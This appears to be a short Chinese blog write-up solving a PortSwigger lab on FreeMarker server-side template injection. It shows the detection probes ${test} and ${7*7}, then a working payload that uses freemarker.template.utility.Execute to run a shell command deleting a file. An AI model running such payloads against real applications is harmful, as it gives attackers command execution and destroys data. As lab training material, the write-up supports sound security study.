该网站可以对发布的网页模板进行编辑



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/模板注入/images/0F739E146B164583B2A1F2C3DF1CA1B0clipboard.png)



## paylaod:

```javascript
${test}
```



模板无法解析报错

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/模板注入/images/F9E21DE131C647FC913D2DB393600ED2clipboard.png)

根据报错信息知道是freemarker模板



## 测试paylaod:

```javascript
${7*7}
```



返回页面查看存在49说明存在漏洞



## 命令执行paylaod:

```javascript
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/Carlos/morale.txt") }
```

